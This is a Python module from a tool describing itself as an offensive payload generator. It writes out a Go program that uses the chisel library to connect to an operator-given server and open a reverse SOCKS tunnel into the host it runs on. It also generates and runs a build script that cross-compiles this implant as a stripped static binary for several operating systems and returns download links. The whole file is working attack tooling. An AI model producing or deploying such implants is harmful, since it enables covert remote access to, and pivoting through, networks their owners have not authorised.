#
# pop is an offensive payload generator
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import getopt
import os
import re
import shutil


TARGETS = {
    'windows': ['amd64', '386'],
    'linux': ['amd64', '386', 'arm64', 'arm'],
    'solaris': ['amd64'],
    'netbsd': ['386', 'amd64', 'arm'],
    'openbsd': ['386', 'amd64', 'arm'],
    'freebsd': ['386', 'amd64', 'arm'],
}


USAGE = 'server proxy-port os-arch'
NARGS = [3, 3]
LANG = 'go'
EXEC = ''


pl = '''
package main

import (
        "log"
        "net/http"

        chclient "github.com/jpillora/chisel/client"
        "github.com/jpillora/chisel/share/cos"
)

func main() {
        config := chclient.Config{Headers: http.Header{}}
        config.Server = "ARG1"
        config.Remotes = []string {"R:ARG2:socks"}
        c, err := chclient.NewClient(&config)
        if err != nil {
                log.Fatal(err)
        }
        go cos.GoStats()
        ctx := cos.InterruptContext()
        if err := c.Start(ctx); err != nil {
                log.Fatal(err)
        }
        if err := c.Wait(); err != nil {
                log.Fatal(err)
        }
}
'''


def g(s, args, dst, url):
    if re.search('[^a-zA-Z0-9:.-]', args[0]) or re.search('[^0-9]', args[1]):
        raise Exception('Invalid argument')

    shutil.copytree('/usr/src/chisel', '{}/chisel'.format(dst))
    with open('{}/main.go'.format(dst), 'w') as fp:
        fp.write(s)
    with open('{}/chisel/main.go'.format(dst), 'w') as fp:
        fp.write(s)

    # mkdir for each targets
    targs = []
    with open('{}/build.sh'.format(dst), 'w') as fp:
        fp.write('cd $(dirname -- "${0}")\ncd chisel\n')
        for tos in TARGETS:
            for arch in TARGETS[tos]:
                fn = '{}-{}'.format(tos, arch)
                if args[2] != fn:
                    continue
                fp.write('''
export CGO_ENABLED=1
export GOOS={}
export GOARCH={}
go build -ldflags "-w -s -extldflags=-static" -trimpath -tags osusergo,netgo,sqlite_omit_load_extension -o {}
'''.format(tos, arch, fn))
                targs += [fn]

    if [] != targs:
        os.system('/bin/sh "{}/build.sh"'.format(dst))
        shutil.copy('{}/chisel/{}'.format(dst, args[2]), dst)

    shutil.rmtree('{}/chisel'.format(dst))

    pl = ['main.go', 'build.sh'] + targs
    return '\n'.join([url + e for e in pl])
